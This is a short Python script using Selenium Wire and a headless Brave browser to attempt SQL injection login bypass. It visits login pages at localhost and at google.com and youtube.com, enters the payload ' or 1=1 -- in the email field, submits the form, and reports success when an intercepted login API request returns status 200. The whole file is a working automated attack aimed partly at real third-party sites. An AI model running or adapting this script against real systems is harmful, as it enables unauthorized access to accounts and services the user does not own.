import requests
from seleniumwire import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By

webpage = r"http://localhost:8080/login"

def checkIfSuccessful(request):
    if request.response.status_code == 200:
        print("SUCCESS ==> {}".format(request.url))
        print("========= BODY ==========")
        print("\t- " + str(request.response.body))
        exit(0)

# Create options instance
chrome_options = Options()

# Use brave as browser
chrome_options.binary_location = "/Applications/Brave Browser.app/Contents/MacOS/Brave Browser"

# Run in headless mode
chrome_options.add_argument("--headless")

# Setup driver
driver = webdriver.Chrome(options=chrome_options)

webpages = ["https://google.com/login", "http://localhost:8080/login", "http://google.com/login", "http://youtube.com/login"]

for web in webpages:
    print("REQUEST TO {}".format(web))
    # Send get request to page
    driver.get(web)

    # Find input elements
    try:
        emailInput = driver.find_element(By.ID, "email")
        passwordInput = driver.find_element(By.ID, "password")
        submitBtn = driver.find_element(By.ID, "submitBtn")
    except:
        continue

    # Fill out form
    jsEmail = "document.getElementById('email').value = `dwdwdwdw\' or 1=1 --`;"
    driver.execute_script(jsEmail)

    jsPassword = "document.getElementById('password').value = 'efioeiofejio';"
    driver.execute_script(jsPassword)

    submitBtn.click()

    # Monitor outgoing requests
    for request in driver.requests:
        if request.response:
            # Check for api route for the login
            if "api" in request.url and "login" in request.url:
                checkIfSuccessful(request)
            elif "api" in request.url and "sign-in" in request.url:
                checkIfSuccessful(request)

# Quit driver
driver.quit()

